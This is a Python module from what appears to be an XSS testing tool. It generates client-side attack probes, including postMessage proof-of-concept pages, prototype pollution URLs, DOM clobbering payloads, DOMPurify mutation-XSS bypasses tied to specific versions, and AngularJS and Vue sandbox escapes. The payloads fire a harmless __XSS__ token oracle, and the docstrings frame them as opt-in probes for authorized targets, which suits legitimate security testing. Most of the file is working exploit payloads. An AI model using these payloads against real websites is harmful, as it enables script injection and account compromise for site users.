"""Modern DOM XSS probe profile generation.

These helpers generate opt-in probes for current client-side XSS research
families: postMessage, prototype pollution, DOM clobbering, sanitizer mXSS,
Trusted Types/CSP telemetry, and framework-specific surfaces.
"""
import html
import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlencode, urlparse, urlunparse, parse_qsl


POST_MESSAGE_ORIGIN_MODES = ("none", "starts_ends", "exact")


FRAMEWORK_SIGNATURES = {
    "angularjs": [
        r"\bangular\.module\b",
        r"\bng-app\b",
        r"\bng-controller\b",
        r"\bng-bind-html\b",
        r"\$sce\.trustAsHtml",
        r"\{\{[^}]+constructor[^}]+\}\}",
    ],
    "vue": [
        r"\bnew\s+Vue\s*\(",
        r"\bv-html\b",
        r"\bcreateApp\s*\(",
        r"data-v-[a-f0-9]+",
    ],
    "react": [
        r"dangerouslySetInnerHTML",
        r"__REACT_DEVTOOLS_GLOBAL_HOOK__",
        r"data-reactroot",
        r"_reactRootContainer",
    ],
    "svelte": [
        r"\bsvelte-",
        r"new\s+\w+\s*\(\s*\{\s*target\s*:",
    ],
    "markdown": [
        r"\bmarked\s*\(",
        r"\bmarkdown-it\b",
        r"\bshowdown\.Converter\b",
        r"\bDOMPurify\.sanitize\s*\(",
    ],
    "rich_text_editor": [
        r"\bckeditor\b",
        r"\btinymce\b",
        r"\bquill\b",
        r"\bprosemirror\b",
        r"\bdraft-js\b",
    ],
}

SANITIZER_SIGNATURES = {
    "dompurify": [r"\bDOMPurify\b", r"dompurify"],
    "sanitize-html": [r"\bsanitizeHtml\b", r"sanitize-html"],
    "xss": [r"\bfilterXSS\b", r"\bxssFilters\b"],
    "bleach": [r"\bbleach\b"],
}


class ModernXSSProfiles:
    """Generate modern client-side XSS probes and fingerprints."""

    @staticmethod
    def default_payload(token: str) -> str:
        """Return a compact oracle payload."""
        return f"<img src=x onerror=__XSS__('{token}')>"

    @staticmethod
    def render_payload(template: Optional[str], token: str) -> str:
        """Render a payload template with an oracle token."""
        if template:
            return template.replace("{{TOKEN}}", token)
        return ModernXSSProfiles.default_payload(token)

    @staticmethod
    def generate_post_message_probes(
        target_url: str,
        token: str,
        payload_template: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Generate postMessage delivery PoCs for an authorized target page."""
        payload = ModernXSSProfiles.render_payload(payload_template, token)
        json_payload = {
            "html": payload,
            "content": payload,
            "message": payload,
            "data": payload,
            "body": payload,
            "url": f"javascript:__XSS__('{token}')",
        }
        encoded_target = html.escape(target_url, quote=True)
        payload_literal = _safe_js_literal(payload)
        json_literal = _safe_js_literal(json_payload)
        target_origin = _origin_for(target_url)

        probes = []

        def add_probe(name: str, script_body: str, notes: str):
            poc_html = f"""<!doctype html>
<meta charset="utf-8">
<title>postMessage DOM XSS probe</title>
<iframe id="target" src="{encoded_target}" style="width:100%;height:600px"></iframe>
<script>
const frame = document.getElementById('target');
const stringPayload = {payload_literal};
const objectPayload = {json_literal};
const nestedPayload = {{
  type: 'render',
  detail: {{ html: stringPayload, content: stringPayload }},
  payload: objectPayload
}};
frame.addEventListener('load', () => {{
  const win = frame.contentWindow;
  {script_body}
}}, {{ once: true }});
</script>"""
            probes.append({
                "family": "postMessage",
                "name": name,
                "target_url": target_url,
                "target_origin": target_origin,
                "token": token,
                "payload": payload,
                "poc_html": poc_html,
                "notes": notes,
            })

        add_probe(
            "wildcard-string-object-json",
            "win.postMessage(stringPayload, '*');\n  win.postMessage(objectPayload, '*');\n  win.postMessage(JSON.stringify(objectPayload), '*');",
            "Sends string, object, and JSON-stringified payloads with wildcard targetOrigin.",
        )
        add_probe(
            "exact-origin-string-object-json",
            f"win.postMessage(stringPayload, { _safe_js_literal(target_origin) });\n  win.postMessage(objectPayload, { _safe_js_literal(target_origin) });\n  win.postMessage(JSON.stringify(objectPayload), { _safe_js_literal(target_origin) });",
            "Sends common payload shapes with exact target origin.",
        )
        add_probe(
            "delayed-repeated-wildcard",
            "let count = 0;\n  const timer = setInterval(() => {\n    win.postMessage(stringPayload, '*');\n    win.postMessage(objectPayload, '*');\n    if (++count >= 5) clearInterval(timer);\n  }, 250);",
            "Retries after delayed app listener registration.",
        )
        add_probe(
            "nested-object-json",
            "win.postMessage(nestedPayload, '*');\n  win.postMessage(JSON.stringify(nestedPayload), '*');",
            "Targets listeners that read nested message fields.",
        )

        return probes

    @staticmethod
    def normalize_post_message_origin_modes(modes: Optional[List[str]]) -> List[str]:
        """Normalize postMessage origin test modes.

        Defaults favor reportable checks plus weak-origin-validation discovery.
        The exact mode is useful triage, but should not be treated as standalone
        exploitability because browsers do not let attackers forge event.origin.
        """
        requested = modes or ["none", "starts_ends"]
        normalized: List[str] = []
        aliases = {
            "none": "none",
            "real": "none",
            "local": "none",
            "starts_ends": "starts_ends",
            "starts-ends": "starts_ends",
            "prefix_suffix": "starts_ends",
            "prefix-suffix": "starts_ends",
            "exact": "exact",
        }
        for mode in requested:
            key = str(mode).strip().lower()
            canonical = aliases.get(key)
            if not canonical:
                raise ValueError(
                    f"Unsupported postMessage origin mode '{mode}'. "
                    f"Use one of: {', '.join(POST_MESSAGE_ORIGIN_MODES)}"
                )
            if canonical not in normalized:
                normalized.append(canonical)
        return normalized

    @staticmethod
    def fake_post_message_origin(target_url: str, mode: str) -> Optional[str]:
        """Return the instrumented event.origin value for an origin mode."""
        canonical = ModernXSSProfiles.normalize_post_message_origin_modes([mode])[0]
        if canonical == "none":
            return None

        target_origin = _origin_for(target_url)
        if canonical == "exact":
            return target_origin

        parsed = urlparse(target_url)
        host_suffix = parsed.netloc or parsed.hostname or "target.invalid"
        if target_origin == "*":
            return "https://target.invalid.xssboss-poc.invalid.target.invalid"
        return f"{target_origin}.xssboss-poc.invalid.{host_suffix}"

    @staticmethod
    def expand_post_message_origin_modes(
        probes: List[Dict[str, Any]],
        target_url: str,
        modes: Optional[List[str]] = None,
        serve_http: bool = True,
    ) -> List[Dict[str, Any]]:
        """Expand postMessage probes across origin-validation test modes."""
        expanded: List[Dict[str, Any]] = []
        for mode in ModernXSSProfiles.normalize_post_message_origin_modes(modes):
            fake_origin = ModernXSSProfiles.fake_post_message_origin(target_url, mode)
            if mode == "none":
                origin_notes = "Runs from the real local PoC origin."
            elif mode == "starts_ends":
                origin_notes = (
                    "Uses an instrumented event.origin that starts with the target origin "
                    "and ends with the target host to expose startsWith/endsWith validation flaws."
                )
            else:
                origin_notes = (
                    "Uses an instrumented exact event.origin for reachability triage only; "
                    "do not report this as exploitability without a real origin bypass."
                )

            for probe in probes:
                item = dict(probe)
                item["base_name"] = probe["name"]
                item["name"] = f"{probe['name']}::origin-{mode}"
                item["post_message_origin_mode"] = mode
                item["fake_message_origin"] = fake_origin
                item["serve_http"] = serve_http
                item["notes"] = f"{probe.get('notes', '')} {origin_notes}".strip()
                expanded.append(item)
        return expanded

    @staticmethod
    def generate_prototype_pollution_probes(
        target_url: str,
        token: str,
        payload_template: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Generate common client-side prototype pollution URL variants."""
        payload = ModernXSSProfiles.render_payload(payload_template, token)
        js_url = f"javascript:__XSS__('{token}')"
        keys = {
            "html": payload,
            "innerHTML": payload,
            "template": payload,
            "srcdoc": f"<svg onload=parent.__XSS__('{token}')>",
            "src": js_url,
            "href": js_url,
            "onerror": f"__XSS__('{token}')",
            "sequence": f"__XSS__('{token}')",
            "sourceURL": f"\n__XSS__('{token}')\n//",
            "publicPath": js_url,
            "hitCallback": f"__XSS__('{token}')",
            "url": js_url,
            "baseUrl": js_url,
        }

        probes = []
        for key, value in keys.items():
            variants = [
                {f"__proto__[{key}]": value},
                {f"constructor[prototype][{key}]": value},
                {f"__proto__.{key}": value},
            ]
            for params in variants:
                probes.append({
                    "family": "prototype_pollution",
                    "name": next(iter(params.keys())),
                    "target_url": _with_query(target_url, params),
                    "hash_url": f"{target_url}#{urlencode(params)}",
                    "token": token,
                    "payload": value,
                    "notes": "Opt-in probe. Verify functionality impact carefully and reload between attempts.",
                })

        return probes

    @staticmethod
    def generate_dom_clobbering_payloads(token: str) -> List[Dict[str, Any]]:
        """Generate DOM clobbering payload families for injection contexts."""
        js_url = f"javascript:__XSS__('{token}')"
        payloads = [
            {
                "name": "named-anchor-href",
                "payload": f'<a id=redirectTo name=href href="{html.escape(js_url, quote=True)}"></a>',
                "notes": "Targets code that trusts window.redirectTo.href or named properties.",
            },
            {
                "name": "form-named-input",
                "payload": f'<form id=config><input name=html value="{html.escape(ModernXSSProfiles.default_payload(token), quote=True)}"></form>',
                "notes": "Targets code that treats named form controls as config properties.",
            },
            {
                "name": "iframe-name-srcdoc",
                "payload": f'<iframe name=template srcdoc="<svg onload=parent.__XSS__(\\\'{token}\\\')>"></iframe>',
                "notes": "Targets named frame/template lookups.",
            },
            {
                "name": "duplicate-id-name",
                "payload": f'<a id=app name=cfg></a><a id=app name=html href="{html.escape(js_url, quote=True)}"></a>',
                "notes": "Targets duplicate id/name resolution edge cases.",
            },
            {
                "name": "double-anchor-nested",
                "payload": f'<a id=x></a><a id=x name=y href="{html.escape(js_url, quote=True)}"></a>',
                "notes": "Targets nested properties like x.y.href.",
            },
            {
                "name": "html-collection-index",
                "payload": f'<iframe id=x name=y></iframe><iframe id=x></iframe>',
                "notes": "Clobbers HTMLCollection length/index lookups.",
            },
            {
                "name": "document-body-overwrite",
                "payload": f'<form id=body><input name=attributes value="{html.escape(token, quote=True)}"></form>',
                "notes": "Clobbers document.body property, causing attribute check failures.",
            },
            {
                "name": "active-element-tabindex",
                "payload": f'<form id=activeElement tabindex=0 onfocus=__XSS__(\'{token}\') autofocus></form>',
                "notes": "Clobbers document.activeElement focus handler lookup.",
            },
            {
                "name": "csp-script-src-clobber",
                "payload": f'<a id=config name=url href="{html.escape(js_url, quote=True)}"></a>',
                "notes": "Clobbers config URLs utilized to load external scripts/stylesheets.",
            },
        ]

        for item in payloads:
            item["family"] = "dom_clobbering"
            item["token"] = token
        return payloads

    @staticmethod
    def generate_sanitizer_mxss_payloads(token: str) -> List[Dict[str, Any]]:
        """Generate parser-differential payloads for sanitizer regression testing."""
        payload_specs = [
            {
                "name": "mxss-dompurify-lt-2.0.17",
                "payload": f'<math><mtext><table><a href="&lt;/table&gt;&lt;img src=x onerror=__XSS__(\\\'{token}\\\')&gt;">',
                "target_version": "DOMPurify < 2.0.17",
                "notes": "Exploits HTML nesting parsing differentials inside math blocks."
            },
            {
                "name": "mxss-dompurify-lt-2.2.2",
                "payload": f'<math><annotation-xml encoding="text/html"><svg><desc><rect class="&lt;/g&gt;&lt;img src=x onerror=__XSS__(\\\'{token}\\\')&gt;"></rect></desc></svg></annotation-xml></math>',
                "target_version": "DOMPurify < 2.2.2",
                "notes": "Exploits XML namespace confusion inside annotation-xml blocks."
            },
            {
                "name": "mxss-dompurify-lt-2.3.6",
                "payload": f'<math><mtext><option><desc><noscript><svg><a href="&lt;/noscript&gt;&lt;img src=x onerror=__XSS__(\\\'{token}\\\')&gt;"></svg></noscript></desc></option></mtext></math>',
                "target_version": "DOMPurify < 2.3.6",
                "notes": "Exploits nested math, option, and noscript parsing differentials."
            },
            {
                "name": "mxss-dompurify-lt-2.4.0",
                "payload": f'<svg><desc><math><mtext><style><path id="&lt;/style&gt;&lt;img src=x onerror=__XSS__(\\\'{token}\\\')&gt;"></path></style></mtext></math></desc></svg>',
                "target_version": "DOMPurify < 2.4.0 (Chrome < 105)",
                "notes": "Exploits style nesting elements within math and SVG block scopes."
            },
            {
                "name": "mxss-dompurify-lt-2.4.1",
                "payload": f'<math><mtext><option><svg><desc><math><style><path id="&lt;/style&gt;&lt;img src=x onerror=__XSS__(\\\'{token}\\\')&gt;"></style></math></desc></svg></option></mtext></math>',
                "target_version": "DOMPurify < 2.4.1 (Chrome < 106)",
                "notes": "Exploits math and SVG element integration mismatching."
            },
            {
                "name": "mxss-dompurify-lt-3.0.5",
                "payload": f'<div><form><math><mtext><form><input><input></form></mtext></math></form></div>',
                "target_version": "DOMPurify < 3.0.5",
                "notes": "Exploits nested HTML forms within math tags to trigger clobbering/mXSS."
            },
            {
                "name": "mxss-dompurify-lt-3.0.10",
                "payload": f'<svg><style><g class="&lt;/style&gt;&lt;img src=x onerror=__XSS__(\\\'{token}\\\')&gt;"></g></style></svg>',
                "target_version": "DOMPurify < 3.0.10",
                "notes": "Exploits style tag parsing inside SVG container groups."
            }
        ]

        for item in payload_specs:
            item["family"] = "sanitizer_mxss"
            item["token"] = token
            
        return payload_specs

    @staticmethod
    def fingerprint_html(html_content: str, headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        """Fingerprint frameworks, sanitizers, CSP, and Trusted Types hints."""
        headers = headers or {}
        haystack = html_content or ""
        lower_headers = {key.lower(): value for key, value in headers.items()}
        csp = lower_headers.get("content-security-policy") or lower_headers.get("content-security-policy-report-only") or ""

        frameworks = _match_signature_groups(haystack, FRAMEWORK_SIGNATURES)
        sanitizers = _match_signature_groups(haystack, SANITIZER_SIGNATURES)
        trusted_types = {
            "required": "require-trusted-types-for" in csp.lower(),
            "policy_names": _extract_trusted_type_policies(csp),
            "script_mentions": sorted(set(re.findall(r"trustedTypes\.createPolicy\s*\(\s*['\"]([^'\"]+)", haystack))),
        }

        return {
            "frameworks": frameworks,
            "sanitizers": sanitizers,
            "csp": {
                "present": bool(csp),
                "raw": csp,
                "strict_dynamic": "'strict-dynamic'" in csp,
                "unsafe_inline": "'unsafe-inline'" in csp,
                "unsafe_eval": "'unsafe-eval'" in csp,
            },
            "trusted_types": trusted_types,
        }

    @staticmethod
    def generate_framework_payloads(token: str, frameworks: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """Generate framework and client-side rendering engine specific payloads."""
        framework_specs = [
            {
                "name": "framework-angularjs-constructor",
                "payload": f"{{{{constructor.constructor('__XSS__(\\\'{token}\\\')')()}}}}",
                "target_framework": "angularjs",
                "notes": "AngularJS sandbox escape constructor breakout."
            },
            {
                "name": "framework-angular-trusted-types",
                "payload": f"<div [innerHTML]=\"'__XSS__(\\\'{token}\\\')'\">",
                "target_framework": "angular",
                "notes": "Angular template / Trusted Types attribute injection."
            },
            {
                "name": "framework-vue-expression",
                "payload": f"{{{{_s.constructor('__XSS__(\\\'{token}\\\')')()}}}}",
                "target_framework": "vue",
                "notes": "VueJS expressions sandbox bypass template injection."
            },
            {
                "name": "framework-vue-directive",
                "payload": f"<div v-html=\"'&lt;img src=x onerror=__XSS__(\\\'{token}\\\')&gt;'\"></div>",
                "target_framework": "vue",
                "notes": "VueJS v-html directive template injection."
            },
            {
                "name": "framework-react-dangerous-html",
                "payload": f"<div dangerouslySetInnerHTML=\"{{{{__html: '&lt;img src=x onerror=__XSS__(\\\'{token}\\\')&gt;'}}}}\" />",
                "target_framework": "react",
                "notes": "React dangerous content attribute parsing check."
            },
            {
                "name": "framework-markdown-purify-mvh",
                "payload": f"<math><mtext><option><svg><desc><math><style><path id=\"&lt;/style&gt;&lt;img src=x onerror=__XSS__(\\\'{token}\\\')&gt;\"></path></style></math></desc></svg></option></mtext></math>",
                "target_framework": "markdown",
                "notes": "Markdown parser namespace confusion mXSS (DOMPurify)."
            },
            {
                "name": "framework-rte-ckeditor-saved",
                "payload": f"<img src=\"x\" data-cke-saved-src=\"javascript:__XSS__('{token}')\">",
                "target_framework": "rich_text_editor",
                "notes": "Rich text editor source-to-sink mapping validation (CKEditor)."
            },
            {
                "name": "framework-rte-tinymce-container",
                "payload": f"<div class=\"mce-content-body\"><img src=x onerror=__XSS__('{token}')></div>",
                "target_framework": "rich_text_editor",
                "notes": "TinyMCE editor iframe sandboxing container breakout."
            },
            {
                "name": "framework-svelte-expression",
                "payload": f"{{''.sub.constructor('__XSS__(\\\'{token}\\\')')()}}",
                "target_framework": "svelte",
                "notes": "Svelte client-side template expression injection."
            },
            {
                "name": "framework-react-ssr-hydration",
                "payload": f"<div data-reactroot=\"\"><script>__XSS__('{token}')</script></div>",
                "target_framework": "react",
                "notes": "React server-rendered hydration mismatch markup injection."
            }
        ]
        
        # If frameworks is provided, filter them. Otherwise, return all as generic.
        if frameworks:
            lower_f = [str(f).lower() for f in frameworks]
            filtered = []
            for spec in framework_specs:
                if spec["target_framework"] in lower_f:
                    filtered.append(spec)
            if filtered:
                framework_specs = filtered

        for item in framework_specs:
            item["family"] = "framework_specific"
            item["token"] = token
            
        return framework_specs


def _with_query(url: str, params: Dict[str, str]) -> str:
    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query, keep_blank_values=True))
    query.update(params)
    return urlunparse(parsed._replace(query=urlencode(query)))


def _match_signature_groups(text: str, signatures: Dict[str, List[str]]) -> List[Dict[str, Any]]:
    results = []
    for name, patterns in signatures.items():
        matches = []
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                matches.append(pattern)
        if matches:
            results.append({"name": name, "matches": matches})
    return results


def _extract_trusted_type_policies(csp: str) -> List[str]:
    match = re.search(r"trusted-types\s+([^;]+)", csp, re.IGNORECASE)
    if not match:
        return []
    return [item for item in match.group(1).split() if item not in ("'none'", "'allow-duplicates'")]


def _origin_for(url: str) -> str:
    parsed = urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        return "*"
    return f"{parsed.scheme}://{parsed.netloc}"


def _safe_js_literal(value: Any) -> str:
    import json

    return (
        json.dumps(value, separators=(",", ":"))
        .replace("<", "\\u003c")
        .replace(">", "\\u003e")
        .replace("&", "\\u0026")
        .replace("</", "<\\/")
    )
